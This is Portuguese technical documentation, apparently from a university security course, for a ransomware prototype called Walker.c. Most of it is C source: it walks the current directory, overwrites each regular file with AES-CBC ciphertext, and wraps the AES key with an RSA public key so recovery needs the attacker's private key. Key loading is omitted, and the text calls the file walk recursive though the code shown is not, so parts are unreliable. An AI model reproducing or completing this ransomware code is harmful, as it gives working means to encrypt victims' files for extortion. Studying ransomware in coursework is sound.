# Walker.c: Documentação Técnica Científica

## 1. Introdução

O presente documento descreve a estrutura, funcionamento e aspectos técnicos do software **Walker.c**, um protótipo de ransomware desenvolvido para fins exclusivamente educacionais no âmbito da disciplina **ES502 - Segurança da Informação** do curso de Engenharia Eletrônica da **Universidade Federal de Pernambuco (UFPE)**.

O projeto visa a exploração aplicada de técnicas criptográficas modernas, incluindo criptografia simétrica (**AES**) e assimétrica (**RSA**), bem como conceitos de segurança ofensiva e engenharia reversa. 

## 2. Objetivo Funcional

O binário gerado pelo projeto realiza operações de criptografia e descriptografia sobre arquivos do diretório de execução. As operações são:

- `--encode` ou `-e`: criptografa os arquivos do diretório atual.
- `--decode` ou `-d`: solicita uma chave RSA privada e reverte os arquivos ao estado original.
- `--help` ou `-h`: exibe a ajuda.

## 3. Seleção de Arquivos

A seleção dos arquivos é realizada pela função `walk`, definida em `FileHandler.c`. Apenas arquivos regulares são processados, utilizando a função `stat` e o macro `S_ISREG`. Diretórios, arquivos ocultos (prefixados por ".") e outros tipos de entrada são descartados. O trecho abaixo demonstra a filtragem de arquivos:

```c
if (stat(path, &info) == 0 && S_ISREG(info.st_mode)) {
    if (encrypt)
        infect(path);
    else
        clean(path, rsa);
}
```

A verificação `S_ISREG` assegura que apenas arquivos regulares sejam processados. Além disso, o código ignora arquivos com nomes iniciados por `"."`:

```c
if (entry->d_name[0] == '.')
    continue;
```

## 4. Arquitetura Modular

A arquitetura do sistema é modular, conforme a seguinte organização:

```
src/
├── main.c                 # Ponto de entrada do programa
├── FileHandler/           # Manipulação de arquivos
│   ├── FileHandler.c
│   └── FileHandler.h
├── encryption/
│   ├── encryption.h       # Header unificado
│   ├── AES/
│   │   ├── AES.c
│   │   └── AES.h
│   └── RSA/
│       ├── RSA.c
│       └── RSA.h
├── keys/                  # Armazenamento de chaves
│   ├── AES.key
│   └── public_key.key
└── ransom.key             # Chave privada RSA
```

## 5. Comportamento do Programa

### 5.1. `main.c`

Este arquivo é o ponto de entrada do programa. Ele interpreta os argumentos de linha de comando utilizando `getopt_long` e direciona o fluxo para as funções apropriadas.

```c
static struct option long_options[] = {
    {"encode", no_argument, 0, 'e'},
    {"decode", no_argument, 0, 'd'},
    {"help",   no_argument, 0, 'h'},
    {0, 0, 0, 0}
};
```

Dependendo da flag escolhida, o programa chama a função `walk`, que percorre os arquivos e aplica a operação desejada. A criptografia ou descriptografia das chaves AES é feita após o processo de arquivo, via `RSA_encrypt` ou `RSA_decrypt`:

```c
switch (opt) {
    case 'e':
        walk(1, NULL);
        RSA_encrypt();
        break;
    case 'd':
        rsa = fopen("ransom.key", "rb");
        if (!rsa) {
            perror("Erro ao abrir chave privada");
            exit(EXIT_FAILURE);
        }
        walk(0, rsa);
        RSA_decrypt(rsa);
        break;
    case 'h':
    default:
        usage(argv[0]);
}
```

### 5.2. `FileHandler.c`

Este módulo agrupa as funções responsáveis pela manipulação dos arquivos no sistema de diretórios.

#### Função `walk`

Percorre recursivamente todos os arquivos do diretório onde o programa foi executado. Para cada arquivo encontrado, chama a função adequada: `infect` (criptografar) ou `clean` (descriptografar), dependendo da operação selecionada.

```c
void walk(int encrypt, FILE *rsa) {
    DIR *dir = opendir(".");
    struct dirent *entry;
    struct stat info;
    char path[4096];

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] == '.')
            continue;

        snprintf(path, sizeof(path), "./%s", entry->d_name);
        if (stat(path, &info) == 0 && S_ISREG(info.st_mode)) {
            if (encrypt)
                infect(path);
            else
                clean(path, rsa);
        }
    }
    closedir(dir);
}
```

#### Função `infect`

Criptografa um arquivo usando AES e, ao final, prepara a chave AES para ser criptografada com RSA. Cada arquivo é sobrescrito com sua versão criptografada.

```c
void infect(char *filename) {
    encryptFile(filename, "keys/AES.key");
}
```

#### Função `clean`

Faz o processo inverso da `infect`. Recebe a chave privada RSA, descriptografa a chave AES previamente salva e utiliza-a para restaurar os arquivos criptografados ao seu estado original.

```c
void clean(char *filename, FILE *rsa) {
    decryptFile(filename, "keys/AES.key");
}
```

### 5.3. `AES.c`

Este arquivo contém as rotinas de criptografia e descriptografia com **AES (Advanced Encryption Standard)**.

#### Função `encryptFile`

Criptografa o conteúdo de um arquivo usando AES no modo CBC. Um IV (vetor de inicialização) aleatório é utilizado para aumentar a segurança. O resultado substitui o conteúdo original do arquivo.

```c
void encryptFile(const char *filename, const char *keyfile) {
    FILE *f = fopen(filename, "rb");
    fseek(f, 0, SEEK_END);
    long filesize = ftell(f);
    rewind(f);

    uint8_t *plaintext = malloc(filesize);
    fread(plaintext, 1, filesize, f);
    fclose(f);

    // Carrega chave AES e IV (omitido)

    uint8_t *ciphertext = malloc(filesize + AES_BLOCKLEN);
    AES_CBC_encrypt_buffer(&aes, ciphertext, plaintext, filesize);

    f = fopen(filename, "wb");
    fwrite(ciphertext, 1, filesize, f);
    fclose(f);

    free(plaintext);
    free(ciphertext);
}
```

#### Função `decryptFile`

Descriptografa o conteúdo de um arquivo criptografado com AES, restaurando seu conteúdo original. A operação depende da chave AES correta e do IV usado na criptografia.

```c
void decryptFile(const char *filename, const char *keyfile) {
    FILE *f = fopen(filename, "rb");
    fseek(f, 0, SEEK_END);
    long filesize = ftell(f);
    rewind(f);

    uint8_t *ciphertext = malloc(filesize);
    fread(ciphertext, 1, filesize, f);
    fclose(f);

    // Carrega chave AES e IV (omitido)

    uint8_t *plaintext = malloc(filesize);
    AES_CBC_decrypt_buffer(&aes, plaintext, ciphertext, filesize);

    f = fopen(filename, "wb");
    fwrite(plaintext, 1, filesize, f);
    fclose(f);

    free(plaintext);
    free(ciphertext);
}
```

### 5.4. `RSA.c`

Implementa a criptografia assimétrica **RSA**, usada exclusivamente para proteger a chave AES.

#### Função `RSA_encrypt`

Criptografa a chave AES com uma chave pública RSA. Essa chave criptografada pode ser armazenada com segurança ou transmitida ao atacante.

```c
void RSA_encrypt() {
    FILE *aesFile = fopen("keys/AES.key", "rb");
    FILE *pubFile = fopen("keys/public_key.key", "rb");

    RSA *rsa = PEM_read_RSA_PUBKEY(pubFile, NULL, NULL, NULL);

    fread(key, 1, AES_KEYLEN, aesFile);
    RSA_public_encrypt(AES_KEYLEN, key, encrypted, rsa, RSA_PKCS1_OAEP_PADDING);

    FILE *out = fopen("keys/AES.enc", "wb");
    fwrite(encrypted, 1, rsa_len, out);
}
```

#### Função `RSA_decrypt`

Recebe uma chave privada RSA e a utiliza para descriptografar a chave AES. Essa operação é crítica para permitir que os arquivos criptografados possam ser recuperados no modo `--decode`.

```c
void RSA_decrypt(FILE *rsaFile) {
    RSA *rsa = PEM_read_RSAPrivateKey(rsaFile, NULL, NULL, NULL);

    FILE *enc = fopen("keys/AES.enc", "rb");
    fread(encrypted, 1, rsa_len, enc);

    RSA_private_decrypt(rsa_len, encrypted, decrypted, rsa, RSA_PKCS1_OAEP_PADDING);

    FILE *out = fopen("keys/AES.key", "wb");
    fwrite(decrypted, 1, AES_KEYLEN, out);
}
```

## 6. Considerações de Segurança

Todas as operações foram implementadas com foco educacional. O armazenamento da chave AES em disco e a sobrescrita dos arquivos originais representam riscos reais de perda de dados. O uso deste código para fins não autorizados pode configurar crime, conforme legislação vigente.

## 7. Conclusão

Walker.c representa um estudo prático e científico da aplicação de criptografia em ataques ransomware. A modularidade do projeto, combinada com técnicas reais de criptografia, permite a compreensão aprofundada do funcionamento desse tipo de software malicioso. 

---

> **Aviso Legal:** Este projeto é estritamente educacional. Não utilize este software em sistemas reais ou com dados sensíveis.
